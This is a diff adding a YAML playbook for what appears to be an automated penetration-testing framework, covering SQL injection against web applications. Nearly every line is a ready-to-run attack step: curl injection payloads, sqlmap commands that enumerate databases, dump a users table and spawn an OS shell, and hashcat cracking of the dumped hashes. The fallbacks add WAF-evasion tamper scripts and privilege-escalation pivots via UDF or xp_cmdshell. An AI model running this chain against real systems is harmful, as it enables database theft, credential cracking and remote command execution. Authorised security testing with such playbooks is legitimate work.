@@ -1,0 +1,58 @@
+id: web_sqli
+title: "SQL injection — confirm, dump, escalate"
+phase: web
+mitre: ["T1190", "T1505.003"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["mysql", "mariadb", "postgresql", "mssql", "oracle", "sqlite"]
+  cves: []
+keywords:
+  - "sqli"
+  - "sql injection"
+  - "sqlmap"
+  - "union select"
+  - "blind sqli"
+  - "boolean-based"
+  - "time-based"
+  - "stacked queries"
+preconditions:
+  - "Identified injectable parameter (suggested by error in baseline, sleep delay, or differential response)"
+  - "Authentication if app gates the vulnerable endpoint"
+steps:
+  - tool: curl
+    cmd:  "curl -s '{base_url}/page?id=1%27' | tail -c 500"
+    why:  "Single quote — look for SQL syntax error in response (error-based SQLi confirmation)"
+  - tool: curl
+    cmd:  "for p in 'AND 1=1' 'AND 1=2'; do echo -n \"$p: \"; curl -s '{base_url}/page?id=1+$p' | wc -c; done"
+    why:  "Boolean-based confirmation — content length should differ"
+  - tool: curl
+    cmd:  "time curl -s '{base_url}/page?id=1+AND+SLEEP(5)' -o /dev/null"
+    why:  "Time-based confirmation when no error/diff"
+  - tool: sqlmap
+    cmd:  "sqlmap -u '{base_url}/page?id=1' --batch --random-agent --level=3 --risk=2 --technique=BEUSTQ --threads=4"
+    why:  "Full automated detection across 6 SQLi families"
+  - tool: sqlmap
+    cmd:  "sqlmap -u '{base_url}/page?id=1' --batch --dbs"
+    why:  "List databases — first concrete proof of exploit"
+  - tool: sqlmap
+    cmd:  "sqlmap -u '{base_url}/page?id=1' --batch -D {db} --tables"
+    why:  "Tables of interest"
+  - tool: sqlmap
+    cmd:  "sqlmap -u '{base_url}/page?id=1' --batch -D {db} -T users --dump"
+    why:  "Dump credentials / hashes"
+  - tool: sqlmap
+    cmd:  "sqlmap -u '{base_url}/page?id=1' --batch --os-shell"
+    why:  "MySQL with FILE priv / MSSQL xp_cmdshell — direct OS command exec"
+  - tool: hashcat
+    cmd:  "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
+    why:  "Crack dumped MD5/bcrypt/SHA-256 hashes (set -m to match)"
+expected_outcome: "Database dump (creds + sensitive data); shell via --os-shell on MySQL/MSSQL when DB user has FILE priv"
+fallbacks:
+  - "If WAF blocks UNION → use stacked queries, time-blind only, or sqlmap --tamper=between,space2comment,charunicodeencode"
+  - "If only blind boolean works → write a custom binary-search script (faster than sqlmap on tiny payloads)"
+  - "DB user without FILE → pivot via UDF (MySQL) or extended stored procs (MSSQL) post-priv"
+  - "NoSQL? Pivot to web_nosqli playbook (mongoinjection / $ne / $gt operators)"
+references:
+  - "https://book.hacktricks.xyz/pentesting-web/sql-injection"
+  - "https://sqlmap.org/"
